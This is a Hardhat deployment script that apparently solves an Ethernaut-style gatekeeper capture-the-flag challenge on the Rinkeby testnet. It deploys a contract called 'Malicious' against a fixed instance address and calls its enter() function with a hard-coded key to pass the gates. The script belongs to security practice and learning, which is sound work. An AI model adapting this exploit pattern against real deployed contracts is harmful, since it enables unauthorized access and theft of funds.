/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const { deployed } = require('./deployed')
const INSTANCE = "0x3D3ABFa36937dc9c5386FB537C082A2f1658E9e5"

async function instanceState(rinkeby) {
  console.log('                          INSTANCE STORAGE STATE')
  console.log("Storage '0':", await rinkeby.getStorageAt(INSTANCE, 0), '\n')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  
  await instanceState(rinkeby);
  // await instanceState(rinkeby)
  // STEP 1 
  //-----------------------------------------------------------------------------
  // Deploying our malicious contract
  console.log("Deploying malicious contract...")
  let Malicious = await hre.ethers.getContractFactory('Malicious')
  let malicious = await Malicious.deploy(INSTANCE)
  await malicious.deployed()

  await deployed("Malicious", hre.network.name, malicious.address)
  //---------------------------------------------------------------------------------




   // STEP 2 
   //---------------------------------------------------------------------------------
   // Pass the Gate keeper
  const  key = [0,0,1,0,0,0,50,214]
  console.log("Pass the 3 gates...")
  const tx = await malicious.enter(key)
  const receipt = await tx.wait()
  console.log("transaction confirmed !\n\n")
  console.log("Receipt: ", receipt)
  console.log("tx: ", tx)
  //---------------------------------------------------------------------------------

  await instanceState(rinkeby)
  
  
  console.log("You win !")
  // console.log(ethers.utils.hexlify(key))
  // const bytesLike = ethers.utils.arrayify(deployer.address)
  // console.log(ethers.utils.hexlify(bytesLike))
  // console.log("My address to bytes: ", bytesLike)
  // // console.log(ethers.utils.hexlify(bytesLike))
  // const uintLike = ethers.utils.hexlify(bytesLike.slice(4))
  // console.log("My address to uint160: ", uintLike)
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
